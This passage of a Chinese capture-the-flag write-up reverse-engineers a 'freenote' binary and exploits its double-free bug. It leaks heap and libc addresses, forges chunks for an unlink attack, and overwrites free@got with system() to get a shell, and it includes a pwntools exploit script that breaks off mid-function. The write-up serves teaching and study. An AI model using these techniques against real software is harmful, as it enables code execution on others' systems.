|     |,==< 0x00400e6f      0f84b7000000   je 0x400f2c                  ; 如果相同，跳过重新分配空间的过程，直接修改笔记
|     |||   0x00400e75      8b45e4         mov eax, dword [local_1ch]
|     |||   0x00400e78      99             cdq
|     |||   0x00400e79      c1ea19         shr edx, 0x19
|     |||   0x00400e7c      01d0           add eax, edx
|     |||   0x00400e7e      83e07f         and eax, 0x7f
|     |||   0x00400e81      29d0           sub eax, edx
|     |||   0x00400e83      ba80000000     mov edx, 0x80               ; 128
|     |||   0x00400e88      29c2           sub edx, eax
|     |||   0x00400e8a      89d0           mov eax, edx
|     |||   0x00400e8c      c1f81f         sar eax, 0x1f
|     |||   0x00400e8f      c1e819         shr eax, 0x19
|     |||   0x00400e92      01c2           add edx, eax
|     |||   0x00400e94      83e27f         and edx, 0x7f
|     |||   0x00400e97      29c2           sub edx, eax
|     |||   0x00400e99      89d0           mov eax, edx
|     |||   0x00400e9b      89c2           mov edx, eax
|     |||   0x00400e9d      8b45e4         mov eax, dword [local_1ch]
|     |||   0x00400ea0      01d0           add eax, edx
|     |||   0x00400ea2      8945ec         mov dword [local_14h], eax
|     |||   0x00400ea5      488b1dfc1120.  mov rbx, qword [0x006020a8] ; [0x6020a8:8]=0
|     |||   0x00400eac      8b45ec         mov eax, dword [local_14h]
|     |||   0x00400eaf      4863c8         movsxd rcx, eax
|     |||   0x00400eb2      488b35ef1120.  mov rsi, qword [0x006020a8] ; [0x6020a8:8]=0
|     |||   0x00400eb9      8b45e8         mov eax, dword [local_18h]
|     |||   0x00400ebc      4863d0         movsxd rdx, eax
|     |||   0x00400ebf      4889d0         mov rax, rdx
|     |||   0x00400ec2      4801c0         add rax, rax                ; '#'
|     |||   0x00400ec5      4801d0         add rax, rdx                ; '('
|     |||   0x00400ec8      48c1e003       shl rax, 3
|     |||   0x00400ecc      4801f0         add rax, rsi                ; '+'
|     |||   0x00400ecf      4883c020       add rax, 0x20
|     |||   0x00400ed3      488b00         mov rax, qword [rax]
|     |||   0x00400ed6      4889ce         mov rsi, rcx                 ; rsi 为分配的大小，算法和 New 过程中的一样
|     |||   0x00400ed9      4889c7         mov rdi, rax                 ; rdi 为 Note 成员 content
|     |||   0x00400edc      e85ff8ffff     call sym.imp.realloc        ; void *realloc(void *ptr, size_t size)
|     |||   0x00400ee1      4889c1         mov rcx, rax
|     |||   0x00400ee4      8b45e8         mov eax, dword [local_18h]
|     |||   0x00400ee7      4863d0         movsxd rdx, eax
|     |||   0x00400eea      4889d0         mov rax, rdx
|     |||   0x00400eed      4801c0         add rax, rax                ; '#'
|     |||   0x00400ef0      4801d0         add rax, rdx                ; '('
|     |||   0x00400ef3      48c1e003       shl rax, 3
|     |||   0x00400ef7      4801d8         add rax, rbx                ; '%'
|     |||   0x00400efa      4883c020       add rax, 0x20
|     |||   0x00400efe      488908         mov qword [rax], rcx
|     |||   0x00400f01      488b35a01120.  mov rsi, qword [0x006020a8] ; [0x6020a8:8]=0
|     |||   0x00400f08      8b45e4         mov eax, dword [local_1ch]
|     |||   0x00400f0b      4863c8         movsxd rcx, eax
|     |||   0x00400f0e      8b45e8         mov eax, dword [local_18h]
|     |||   0x00400f11      4863d0         movsxd rdx, eax
|     |||   0x00400f14      4889d0         mov rax, rdx
|     |||   0x00400f17      4801c0         add rax, rax                ; '#'
|     |||   0x00400f1a      4801d0         add rax, rdx                ; '('
|     |||   0x00400f1d      48c1e003       shl rax, 3
|     |||   0x00400f21      4801f0         add rax, rsi                ; '+'
|     |||   0x00400f24      4883c010       add rax, 0x10
|     |||   0x00400f28      48894808       mov qword [rax + 8], rcx     ; 将新的大小写回 Note 的 length
|     |||   ; JMP XREF from 0x00400e6f (sub.Note_number:_d87)
|     |`--> 0x00400f2c      bf91124000     mov edi, str.Enter_your_note: ; 0x401291 ; "Enter your note: "
|     | |   0x00400f31      b800000000     mov eax, 0
|     | |   0x00400f36      e8a5f7ffff     call sym.imp.printf         ; int printf(const char *format)
|     | |   0x00400f3b      488b0d661120.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0
|     | |   0x00400f42      8b45e8         mov eax, dword [local_18h]
|     | |   0x00400f45      4863d0         movsxd rdx, eax
|     | |   0x00400f48      4889d0         mov rax, rdx
|     | |   0x00400f4b      4801c0         add rax, rax                ; '#'
|     | |   0x00400f4e      4801d0         add rax, rdx                ; '('
|     | |   0x00400f51      48c1e003       shl rax, 3
|     | |   0x00400f55      4801c8         add rax, rcx                ; '&'
|     | |   0x00400f58      4883c020       add rax, 0x20
|     | |   0x00400f5c      488b00         mov rax, qword [rax]
|     | |   0x00400f5f      8b55e4         mov edx, dword [local_1ch]
|     | |   0x00400f62      89d6           mov esi, edx
|     | |   0x00400f64      4889c7         mov rdi, rax
|     | |   0x00400f67      e8f1f8ffff     call sub.read_85d           ; ssize_t read(int fildes, void *buf, size_t nbyte) ; 读入新的笔记内容
|     | |   0x00400f6c      bfa3124000     mov edi, str.Done.          ; 0x4012a3 ; "Done."
|     | |   0x00400f71      e84af7ffff     call sym.imp.puts           ; int puts(const char *s)
|     | |   ; JMP XREF from 0x00400dfb (sub.Note_number:_d87)
|     | |   ; JMP XREF from 0x00400e2c (sub.Note_number:_d87)
|     `-`-> 0x00400f76      4883c418       add rsp, 0x18
|           0x00400f7a      5b             pop rbx
|           0x00400f7b      5d             pop rbp
\           0x00400f7c      c3             ret
```
该函数在输入了笔记序号和大小之后，会先判断新的大小与现在的大小是否相同，如果相同，则不重新分配空间，直接编辑其内容，否则调用 `realloc()` 重新分配一块空间（地址可能与原地址相同，也可能不相同）。

Delete 的实现如下：
```
[0x00400770]> pdf @ sub.No_notes_yet._f7d 
/ (fcn) sub.No_notes_yet._f7d 266
|   sub.No_notes_yet._f7d ();
|           ; var int local_4h @ rbp-0x4
|           ; var int local_0h @ rbp-0x0
|           ; CALL XREF from 0x004010ec (main + 101)
|           0x00400f7d      55             push rbp
|           0x00400f7e      4889e5         mov rbp, rsp
|           0x00400f81      4883ec10       sub rsp, 0x10
|           0x00400f85      488b051c1120.  mov rax, qword [0x006020a8] ; [0x6020a8:8]=0
|           0x00400f8c      488b4008       mov rax, qword [rax + 8]    ; [0x8:8]=-1 ; 8
|           0x00400f90      4885c0         test rax, rax                ; 检查 Notes 成员 length 是否为零，即是否有笔记
|       ,=< 0x00400f93      0f8ee2000000   jle 0x40107b
|       |   0x00400f99      bfa9124000     mov edi, str.Note_number:   ; 0x4012a9 ; "Note number: "
|       |   0x00400f9e      b800000000     mov eax, 0
|       |   0x00400fa3      e838f7ffff     call sym.imp.printf         ; int printf(const char *format)
|       |   0x00400fa8      b800000000     mov eax, 0
|       |   0x00400fad      e89cf9ffff     call sub.atoi_94e           ; int atoi(const char *str)
|       |   0x00400fb2      8945fc         mov dword [local_4h], eax    ; [local_4h] 为要删除笔记的序号
|       |   0x00400fb5      837dfc00       cmp dword [local_4h], 0      ; 检查笔记序号是否有效
|      ,==< 0x00400fb9      7815           js 0x400fd0
|      ||   0x00400fbb      8b45fc         mov eax, dword [local_4h]
|      ||   0x00400fbe      4863d0         movsxd rdx, eax
|      ||   0x00400fc1      488b05e01020.  mov rax, qword [0x006020a8] ; [0x6020a8:8]=0
|      ||   0x00400fc8      488b00         mov rax, qword [rax]
|      ||   0x00400fcb      4839c2         cmp rdx, rax
|     ,===< 0x00400fce      7c0f           jl 0x400fdf
|     |||   ; JMP XREF from 0x00400fb9 (sub.No_notes_yet._f7d)
|     |`--> 0x00400fd0      bfb7124000     mov edi, str.Invalid_number ; 0x4012b7 ; "Invalid number!"
|     | |   0x00400fd5      e8e6f6ffff     call sym.imp.puts           ; int puts(const char *s)
|     |,==< 0x00400fda      e9a6000000     jmp 0x401085
|     |||   ; JMP XREF from 0x00400fce (sub.No_notes_yet._f7d)
|     `---> 0x00400fdf      488b05c21020.  mov rax, qword [0x006020a8] ; [0x6020a8:8]=0
|      ||   0x00400fe6      488b5008       mov rdx, qword [rax + 8]    ; [0x8:8]=-1 ; 8 ; 取出 Notes 成员 length
|      ||   0x00400fea      4883ea01       sub rdx, 1                   ; 将 length -1
|      ||   0x00400fee      48895008       mov qword [rax + 8], rdx     ; 将新的 length 写回去
|      ||   0x00400ff2      488b0daf1020.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0
|      ||   0x00400ff9      8b45fc         mov eax, dword [local_4h]
|      ||   0x00400ffc      4863d0         movsxd rdx, eax
|      ||   0x00400fff      4889d0         mov rax, rdx
|      ||   0x00401002      4801c0         add rax, rax                ; '#'
|      ||   0x00401005      4801d0         add rax, rdx                ; '('
|      ||   0x00401008      48c1e003       shl rax, 3
|      ||   0x0040100c      4801c8         add rax, rcx                ; '&'
|      ||   0x0040100f      4883c010       add rax, 0x10
|      ||   0x00401013      48c700000000.  mov qword [rax], 0           ; 修改 Note 成员 isValid 为 0
|      ||   0x0040101a      488b0d871020.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0
|      ||   0x00401021      8b45fc         mov eax, dword [local_4h]
|      ||   0x00401024      4863d0         movsxd rdx, eax
|      ||   0x00401027      4889d0         mov rax, rdx
|      ||   0x0040102a      4801c0         add rax, rax                ; '#'
|      ||   0x0040102d      4801d0         add rax, rdx                ; '('
|      ||   0x00401030      48c1e003       shl rax, 3
|      ||   0x00401034      4801c8         add rax, rcx                ; '&'
|      ||   0x00401037      4883c010       add rax, 0x10
|      ||   0x0040103b      48c740080000.  mov qword [rax + 8], 0       ; 修改 Note 成员 length 为 0
|      ||   0x00401043      488b0d5e1020.  mov rcx, qword [0x006020a8] ; [0x6020a8:8]=0
|      ||   0x0040104a      8b45fc         mov eax, dword [local_4h]
|      ||   0x0040104d      4863d0         movsxd rdx, eax
|      ||   0x00401050      4889d0         mov rax, rdx
|      ||   0x00401053      4801c0         add rax, rax                ; '#'
|      ||   0x00401056      4801d0         add rax, rdx                ; '('
|      ||   0x00401059      48c1e003       shl rax, 3
|      ||   0x0040105d      4801c8         add rax, rcx                ; '&'
|      ||   0x00401060      4883c020       add rax, 0x20
|      ||   0x00401064      488b00         mov rax, qword [rax]
|      ||   0x00401067      4889c7         mov rdi, rax                 ; rdi 为 Note 成员 content 指向的地址
|      ||   0x0040106a      e841f6ffff     call sym.imp.free           ; void free(void *ptr)
|      ||   0x0040106f      bfa3124000     mov edi, str.Done.          ; 0x4012a3 ; "Done."
|      ||   0x00401074      e847f6ffff     call sym.imp.puts           ; int puts(const char *s)
|     ,===< 0x00401079      eb0a           jmp 0x401085
|     |||   ; JMP XREF from 0x00400f93 (sub.No_notes_yet._f7d)
|     ||`-> 0x0040107b      bfd8124000     mov edi, str.No_notes_yet.  ; 0x4012d8 ; "No notes yet."
|     ||    0x00401080      e83bf6ffff     call sym.imp.puts           ; int puts(const char *s)
|     ||    ; JMP XREF from 0x00400fda (sub.No_notes_yet._f7d)
|     ||    ; JMP XREF from 0x00401079 (sub.No_notes_yet._f7d)
|     ``--> 0x00401085      c9             leave
\           0x00401086      c3             ret
```
该函数在读入要删除的笔记序号后，首先将 Notes 结构体成员 `length -1`，然后将对应的 Note 结构体的 `isValid` 和 `length` 修改为 `0`，然后 free 掉笔记的内容（`*content`）。


## 漏洞利用
在上面逆向的过程中我们发现，程序存在 double free 漏洞。在 Delete 的时候，只是设置了 `isValid =0` 作为标记，而没有将该笔记从 Notes 中移除，也没有将 `content` 设置为 NULL，然后就调用了 free 函数。整个过程没有对 `isValid` 是否已经为 `0` 做任何检查。于是我们可以对同一个笔记 Delete 两次，造成 double free，修改 GOT 表，改变程序的执行流。

#### 泄漏地址
第一步先泄漏堆地址。为方便调试，就先关掉 ASLR 吧：
```
gef➤  vmmap heap
Start              End                Offset             Perm Path
0x0000000000603000 0x0000000000625000 0x0000000000000000 rw- [heap]
gef➤  vmmap libc
Start              End                Offset             Perm Path
0x00007ffff7a15000 0x00007ffff7bd0000 0x0000000000000000 r-x /home/firmy/libc.so.6_1
0x00007ffff7bd0000 0x00007ffff7dcf000 0x00000000001bb000 --- /home/firmy/libc.so.6_1
0x00007ffff7dcf000 0x00007ffff7dd3000 0x00000000001ba000 r-- /home/firmy/libc.so.6_1
0x00007ffff7dd3000 0x00007ffff7dd5000 0x00000000001be000 rw- /home/firmy/libc.so.6_1
```

为了泄漏堆地址，我们需要释放 2 个不相邻且不会被合并进 top chunk 里的 chunk，所以我们创建 4 个笔记，可以看到由初始化阶段创建的 Notes 和 Note 结构体：
```python
for i in range(4):
    newnote("A"*8)
```
```
gef➤  x/16gx 0x00603000
0x603000:	0x0000000000000000	0x0000000000001821
0x603010:	0x0000000000000100	0x0000000000000004  <-- Notes.max <-- Notes.length
0x603020:	0x0000000000000001	0x0000000000000008  <-- Notes.notes[0].isValid <-- Notes.notes[0].length
0x603030:	0x0000000000604830	0x0000000000000001  <-- Notes.notes[0].content
0x603040:	0x0000000000000008	0x00000000006048c0
0x603050:	0x0000000000000001	0x0000000000000008
0x603060:	0x0000000000604950	0x0000000000000001
0x603070:	0x0000000000000008	0x00000000006049e0
```
下面是创建的 4 个笔记：
```
gef➤  x/4gx 0x00603000+0x1820
0x604820:	0x0000000000000000	0x0000000000000091  <-- chunk 0
0x604830:	0x4141414141414141	0x0000000000000000      <-- *notes[0].content
gef➤  x/4gx 0x00603000+0x1820+0x90*1
0x6048b0:	0x0000000000000000	0x0000000000000091  <-- chunk 1
0x6048c0:	0x4141414141414141	0x0000000000000000      <-- *notes[1].content
gef➤  x/4gx 0x00603000+0x1820+0x90*2
0x604940:	0x0000000000000000	0x0000000000000091  <-- chunk 2
0x604950:	0x4141414141414141	0x0000000000000000      <-- *notes[2].content
gef➤  x/4gx 0x00603000+0x1820+0x90*3
0x6049d0:	0x0000000000000000	0x0000000000000091  <-- chunk 3
0x6049e0:	0x4141414141414141	0x0000000000000000      <-- *notes[3].content
gef➤  x/4gx 0x00603000+0x1820+0x90*4
0x604a60:	0x0000000000000000	0x00000000000205a1  <-- top chunk
0x604a70:	0x0000000000000000	0x0000000000000000
```

现在我们释放掉 chunk 0 和 chunk 2：
```python
delnote(0)
delnote(2)
```
```
gef➤  x/16gx 0x00603000
0x603000:	0x0000000000000000	0x0000000000001821
0x603010:	0x0000000000000100	0x0000000000000002  <-- Notes.length
0x603020:	0x0000000000000000	0x0000000000000000  <-- notes[0].isValid <-- notes[0].length
0x603030:	0x0000000000604830	0x0000000000000001  <-- notes[0].content
0x603040:	0x0000000000000008	0x00000000006048c0
0x603050:	0x0000000000000000	0x0000000000000000  <-- notes[2].isValid <-- notes[2].length
0x603060:	0x0000000000604950	0x0000000000000001  <-- notes[2].content
0x603070:	0x0000000000000008	0x00000000006049e0
gef➤  x/4gx 0x00603000+0x1820
0x604820:	0x0000000000000000	0x0000000000000091  <-- chunk 0 [be freed]
0x604830:	0x00007ffff7dd37b8	0x0000000000604940  <-- fd->main_arena+88 <-- bk->chunk 2
gef➤  x/4gx 0x00603000+0x1820+0x90*1
0x6048b0:	0x0000000000000090	0x0000000000000090  <-- chunk 1
0x6048c0:	0x4141414141414141	0x0000000000000000
gef➤  x/4gx 0x00603000+0x1820+0x90*2
0x604940:	0x0000000000000000	0x0000000000000091  <-- chunk 2 [be freed]
0x604950:	0x0000000000604820	0x00007ffff7dd37b8  <-- fd->chunk 0 <-- bk->main_arena+88
gef➤  x/4gx 0x00603000+0x1820+0x90*3
0x6049d0:	0x0000000000000090	0x0000000000000090  <-- chunk 3
0x6049e0:	0x4141414141414141	0x0000000000000000
gef➤  x/4gx 0x00603000+0x1820+0x90*4
0x604a60:	0x0000000000000000	0x00000000000205a1  <-- top chunk
0x604a70:	0x0000000000000000	0x0000000000000000
```
chunk 0 和 chunk 2 被放进了 unsorted bin，且它们的 fd 和 bk 指针有我们需要的地址。

为了泄漏堆地址，我们分配一个内容长度为 8 的笔记，malloc 将从 unsorted bin 中把原来 chunk 0 的空间取出来：
```python
newnote("A"*8)
```
```
gef➤  x/16gx 0x00603000
0x603000:	0x0000000000000000	0x0000000000001821
0x603010:	0x0000000000000100	0x0000000000000003  <-- Notes.length
0x603020:	0x0000000000000001	0x0000000000000008  <-- notes[0].isValid <-- notes[0].length
0x603030:	0x0000000000604830	0x0000000000000001  <-- notes[0].content
0x603040:	0x0000000000000008	0x00000000006048c0
0x603050:	0x0000000000000000	0x0000000000000000  <-- notes[2].isValid <-- notes[2].length
0x603060:	0x0000000000604950	0x0000000000000001  <-- notes[2].content
0x603070:	0x0000000000000008	0x00000000006049e0
gef➤  x/4gx 0x00603000+0x1820
0x604820:	0x0000000000000000	0x0000000000000091  <-- chunk 0
0x604830:	0x4141414141414141	0x0000000000604940      <-- info leak
gef➤  x/4gx 0x00603000+0x1820+0x90*1
0x6048b0:	0x0000000000000090	0x0000000000000091  <-- chunk 1
0x6048c0:	0x4141414141414141	0x0000000000000000
gef➤  x/4gx 0x00603000+0x1820+0x90*2
0x604940:	0x0000000000000000	0x0000000000000091  <-- chunk 2 [be freed]
0x604950:	0x00007ffff7dd37b8	0x00007ffff7dd37b8  <-- fd->chunk 0 <-- bk->main_arena+88
gef➤  x/4gx 0x00603000+0x1820+0x90*3
0x6049d0:	0x0000000000000090	0x0000000000000090  <-- chunk 3
0x6049e0:	0x4141414141414141	0x0000000000000000
gef➤  x/4gx 0x00603000+0x1820+0x90*4
0x604a60:	0x0000000000000000	0x00000000000205a1  <-- top chunk
0x604a70:	0x0000000000000000	0x0000000000000000
```
为什么是 8 呢？我们同样可以看到程序的读入是有问题的，没有在字符串末尾加上 `\0`，导致了信息泄漏的发生，接下来只要调用 List 就可以把 chunk 2 的地址 `0x604940` 打印出来。然后根据 chunk 2 的偏移，即可计算出堆起始地址：
```python
s = listnote(0)[8:]
heap_addr = u64((s.ljust(8, "\x00"))[:8])
heap_base = heap_addr - 0x1940      # 0x1940 = 0x1820 + 0x90*2
```

其实我们还可以得到 libc 的地址，方法如下：
```
gef➤  x/20gx 0x00007ffff7dd37b8-0x78
0x7ffff7dd3740 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd3750:	0x0000000000000000	0x0000000000000000
0x7ffff7dd3760:	0x0000000100000000	0x0000000000000000  <-- main_arena
0x7ffff7dd3770:	0x0000000000000000	0x0000000000000000
0x7ffff7dd3780:	0x0000000000000000	0x0000000000000000
0x7ffff7dd3790:	0x0000000000000000	0x0000000000000000
0x7ffff7dd37a0:	0x0000000000000000	0x0000000000000000
0x7ffff7dd37b0:	0x0000000000000000	0x0000000000604a60      <-- top
0x7ffff7dd37c0:	0x0000000000000000	0x0000000000604940
0x7ffff7dd37d0:	0x0000000000604820	0x00007ffff7dd37c8
```
我们看到 `__malloc_hook` 在这个地址 `0x00007ffff7dd37b8-0x78` 的地方。其实 `0x7ffff7dd3760` 地方开始就是 `main_arena`，但在这个 libc 里符号被 stripped 扔掉了。看一下 `__malloc_hook` 在 libc 中的偏移：
```
$ readelf -s libc.so.6_1 | grep __malloc_hook
  1079: 00000000003be740     8 OBJECT  WEAK   DEFAULT   31 __malloc_hook@@GLIBC_2.2.5
```
因为偏移是不变的，我们总是可以计算出 libc 的地址：
```
libc_base = leak_addr - (0x3be740 + 0x78)
```
过程和泄漏堆地址是一样的，这里就不展示了，代码如下：
```python
newnote("A"*8)
s = listnote(2)[8:]
libc_addr = u64((s.ljust(8, "\x00"))[:8])
libc_base = libc_addr - (0x3be740 + 0x78)   # __malloc_hook + 0x78
```

这一步的最后只要把创建的所有笔记都删掉就好了：
```
gef➤  x/16gx 0x00603000
0x603000:	0x0000000000000000	0x0000000000001821
0x603010:	0x0000000000000100	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000604830	0x0000000000000000
0x603040:	0x0000000000000000	0x00000000006048c0
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000604950	0x0000000000000000
0x603070:	0x0000000000000000	0x00000000006049e0
gef➤  x/4gx 0x00603000+0x1820
0x604820:	0x0000000000000000	0x00000000000207e1
0x604830:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
gef➤  x/4gx 0x00603000+0x1820+0x90*1
0x6048b0:	0x0000000000000090	0x0000000000000090
0x6048c0:	0x4141414141414141	0x0000000000000000
gef➤  x/4gx 0x00603000+0x1820+0x90*2
0x604940:	0x0000000000000120	0x0000000000000090
0x604950:	0x4141414141414141	0x00007ffff7dd37b8
gef➤  x/4gx 0x00603000+0x1820+0x90*3
0x6049d0:	0x00000000000001b0	0x0000000000000090  <-- chunk 3 [be freed]
0x6049e0:	0x4141414141414141	0x0000000000000000
gef➤  x/4gx 0x00603000+0x1820+0x90*4
0x604a60:	0x0000000000000000	0x00000000000205a1
0x604a70:	0x0000000000000000	0x0000000000000000
```
所有的 chunk 都被合并到了 top chunk 里，需要重点关注的是 chunk 3 的 prev_size 字段：
```
0x6049d0 - 0x1b0 = 0x604820
```
所以其实它指向的是 chunk 0，如果再次释放 chunk 3，它会根据 prev_size 找到 chunk 0，并执行 unlink，然而如果直接这样做的话，马上就被 libc 检查出来了，double free 异常被触发，程序崩溃。所以我们接下来我们通过修改 prev_size 指向一个 fake chunk，来成功 unlink。

#### unlink
有了堆地址，根据 unlink 攻击的一般思想，我们总共创建 3 块 chunk，在 chunk 0 中构造 fake chunk，在 chunk 1 中放置 `/bin/sh` 字符串，用来作为 `system()` 函数的参数，chunk 2 里再放置两个 fake chunk：
```python
newnote(p64(0) + p64(0) + p64(heap_base + 0x18) + p64(heap_base + 0x20))    # note 0
newnote('/bin/sh\x00')  # note 1
newnote("A"*128 + p64(0x1a0)+p64(0x90)+"A"*128 + p64(0)+p64(0x21)+"A"*24 + "\x01")   # note 2
```

为什么这样构造呢？回顾一下 unlink 的操作如下：
```
FD = P->fd;
BK = P->bk;
FD->bk = BK
BK->fd = FD
```
需要绕过的检查：
```
(P->fd->bk != P || P->bk->fd != P) == False
```
最终效果是：
```
FD->bk = P = BK = &P - 16
BK->fd = P = FD = &P - 24
```
为了绕过它，我们需要一个指向 chunk 头的指针，通过前面的分析我们知道 Note.content 正好指向 chunk 头，而且没有被置空，那么就可以通过泄漏出来的堆地址计算出这个指针的地址。

全部堆块的情况如下：
```
gef➤  x/4gx 0x603018
0x603018:	0x0000000000000003	0x0000000000000001
0x603028:	0x0000000000000020	0x0000000000604830      <-- bk pointer
gef➤  x/4gx 0x603020
0x603020:	0x0000000000000001	0x0000000000000020
0x603030:	0x0000000000604830	0x0000000000000001      <-- fd pointer
gef➤  x/90gx 0x00603000+0x1820
0x604820:	0x0000000000000000	0x0000000000000091  <-- chunk 0
0x604830:	0x0000000000000000	0x0000000000000000  <-- fake chunk
0x604840:	0x0000000000603018	0x0000000000603020      <-- fd pointer <-- bk pointer
0x604850:	0x0000000000000000	0x0000000000000000
0x604860:	0x0000000000000000	0x0000000000000000
0x604870:	0x0000000000000000	0x0000000000000000
0x604880:	0x0000000000000000	0x0000000000000000
0x604890:	0x0000000000000000	0x0000000000000000
0x6048a0:	0x0000000000000000	0x0000000000000000
0x6048b0:	0x0000000000000090	0x0000000000000091  <-- chunk 1
0x6048c0:	0x0068732f6e69622f	0x0000000000000000      <-- '/bin/sh'
0x6048d0:	0x0000000000000000	0x0000000000000000
0x6048e0:	0x0000000000000000	0x0000000000000000
0x6048f0:	0x0000000000000000	0x0000000000000000
0x604900:	0x0000000000000000	0x0000000000000000
0x604910:	0x0000000000000000	0x0000000000000000
0x604920:	0x0000000000000000	0x0000000000000000
0x604930:	0x0000000000000000	0x0000000000000000
0x604940:	0x0000000000000120	0x0000000000000191  <-- chunk 2
0x604950:	0x4141414141414141	0x4141414141414141
0x604960:	0x4141414141414141	0x4141414141414141
0x604970:	0x4141414141414141	0x4141414141414141
0x604980:	0x4141414141414141	0x4141414141414141
0x604990:	0x4141414141414141	0x4141414141414141
0x6049a0:	0x4141414141414141	0x4141414141414141
0x6049b0:	0x4141414141414141	0x4141414141414141
0x6049c0:	0x4141414141414141	0x4141414141414141
0x6049d0:	0x00000000000001a0	0x0000000000000090      <-- chunk 3 pointer
0x6049e0:	0x4141414141414141	0x4141414141414141
0x6049f0:	0x4141414141414141	0x4141414141414141
0x604a00:	0x4141414141414141	0x4141414141414141
0x604a10:	0x4141414141414141	0x4141414141414141
0x604a20:	0x4141414141414141	0x4141414141414141
0x604a30:	0x4141414141414141	0x4141414141414141
0x604a40:	0x4141414141414141	0x4141414141414141
0x604a50:	0x4141414141414141	0x4141414141414141
0x604a60:	0x0000000000000000	0x0000000000000021      <-- fake next chunk PREV_INUSE
0x604a70:	0x4141414141414141	0x4141414141414141
0x604a80:	0x4141414141414141	0x0000000000000001      <-- fake next next chunk PREV_INUSE
0x604a90:	0x0000000000000000	0x0000000000000000
0x604aa0:	0x0000000000000000	0x0000000000000000
0x604ab0:	0x0000000000000000	0x0000000000000000
0x604ac0:	0x0000000000000000	0x0000000000000000
0x604ad0:	0x0000000000000000	0x0000000000020531  <-- top chunk
0x604ae0:	0x0000000000000000	0x0000000000000000
```
首先是 chunk 0，在它里面包含了一个 fake chunk，且设置了 bk、fd 指针用于绕过检查。

chunk 2 分配了很大的空间，把 chunk 3 指针也包含了进去，这样就可以对 chunk 3 的 prev_size 进行设置，我们将其修改为 `0x1a0`，于是 `0x6049d0 - 0x1a0 = 0x604830`，即 fake chunk 的位置。另外，在释放 chunk 3 时，libc 会检查后一个堆块的 `PREV_INUSE` 标志位，同时也为了防止 free 后的 chunk 被合并进 top chunk，所以需要在 chunk 3 后布置一个 fake chunk，同样的 fake chunk 的后一个堆块也必须是 `PREV_INUSE` 的，以防止 chunk 3 与 fake chunk 合并。

接下来就是释放 chunk 3，触发 unlink：
```python
delnote(3)
```
```
gef➤  x/16gx 0x00603000
0x603000:	0x0000000000000000	0x0000000000001821
0x603010:	0x0000000000000100	0x0000000000000002
0x603020:	0x0000000000000001	0x0000000000000020
0x603030:	0x0000000000603018	0x0000000000000001  <-- notes[0].content
0x603040:	0x0000000000000008	0x00000000006048c0
0x603050:	0x0000000000000001	0x0000000000000139
0x603060:	0x0000000000604950	0x0000000000000000
0x603070:	0x0000000000000000	0x00000000006049e0
```
我们看到，note 0 的 content 指针被修改了，原本指向 fake chunk，现在却指向了自身地址减 0x18 的位置，这意味着我们可以将其改为任意地址。

#### overwrite note
这一步我们利用 Edit 功能先将 notes[0].content 该为 `free@got`：
```python
editnote(0, p64(2) + p64(1)+p64(8)+p64(elf.got['free']))
```
```
gef➤  x/16gx 0x00603000
0x603000:	0x0000000000000000	0x0000000000001821
0x603010:	0x0000000000000100	0x0000000000000002
0x603020:	0x0000000000000001	0x0000000000000008  <-- notes[0].length = 8
0x603030:	0x0000000000602018	0x0000000000000001  <-- notes[0].content = free@got
0x603040:	0x0000000000000008	0x00000000006048c0
0x603050:	0x0000000000000001	0x0000000000000139
0x603060:	0x0000000000604950	0x0000000000000000
0x603070:	0x0000000000000000	0x00000000006049e0
gef➤  x/gx 0x602018
0x602018 <free@got.plt>:	0x00007ffff7a97df0
```
另外这里将 length 设置为 8 也是有意义的，因为我们下一步修改 free 的地址为 system 地址，正好是 8 个字符长度，程序直接编辑其内容而不会调用 realloc 重新分配空间：
```python
editnote(0, p64(system_addr))
```
```
gef➤  x/gx 0x602018
0x602018 <free@got.plt>:	0x00007ffff7a5b640
gef➤  p system
$1 = {<text variable, no debug info>} 0x7ffff7a5b640 <system>
```
于是最后一步调用 free 时，实际上是调用了 `system('/bin/sh')`：
```
delnote(1)
```
```
gef➤  x/s 0x6048c0
0x6048c0:	"/bin/sh"
```

#### pwn
开启 ASLR。Bingo!!!
```
$ python exp.py 
[+] Starting local process './freenote': pid 30146
[*] heap base: 0x23b5000
[*] libc base: 0x7efc6903e000
[*] system address: 0x7efc69084640
[*] Switching to interactive mode
$ whoami
firmy
```

#### exploit
完整的 exp 如下：
```python
from pwn import *

io = process(['./freenote'], env={'LD_PRELOAD':'./libc.so.6_1'})
elf = ELF('freenote')
libc = ELF('libc.so.6_1')

def newnote(x):
    io.recvuntil("Your choice: ")
    io.sendline("2")
    io.recvuntil("Length of new note: ")
    io.sendline(str(len(x)))
    io.recvuntil("Enter your note: ")
    io.send(x)

def delnote(x):
    io.recvuntil("Your choice: ")
    io.sendline("4")
    io.recvuntil("Note number: ")
    io.sendline(str(x))

def listnote(x):
    io.recvuntil("Your choice: ")
    io.sendline("1")
    io.recvuntil("%d. " % x)
    return io.recvline(keepends=False)

def editnote(x, s):
    io.recvuntil("Your choice: ")
    io.sendline("3")
    io.recvuntil("Note number: ")
    io.sendline(str(x))
    io.recvuntil("Length of note: ")
    io.sendline(str(len(s)))
    io.recvuntil("Enter your note: ")
    io.send(s)

def leak_base():
    global heap_base
    global libc_base

    for i in range(4):
        newnote("A"*8)

    delnote(0)
    delnote(2)

    newnote("A"*8)  # note 0

    s = listnote(0)[8:]
    heap_addr = u64((s.ljust(8, "\x00"))[:8])
    heap_base = heap_addr - 0x1940      # 0x1940 = 0x1820 + 0x90*2
    log.info("heap base: 0x%x" % heap_base)

    newnote("A"*8)  # note 2

    s = listnote(2)[8:]
    libc_addr = u64((s.ljust(8, "\x00"))[:8])
    libc_base = libc_addr - (libc.symbols['__malloc_hook'] + 0x78)   # 0x78 = libc_addr - __malloc_hook_addr
    log.info("libc base: 0x%x" % libc_base)

    for i in range(4):
        delnote(i)

def unlink():
    newnote(p64(0) + p64(0) + p64(heap_base + 0x18) + p64(heap_base + 0x20))    # note 0
    newnote('/bin/sh\x00')  # note 1
    newnote("A"*128 + p64(0x1a0)+p64(0x90)+"A"*128 + p64(0)+p64(0x21)+"A"*24 + "\x01")   # note 2
    delnote(3)  # double free

def overwrite_note():
    system_addr = libc_base + libc.symbols['system']
    log.info("system address: 0x%x" % system_addr)

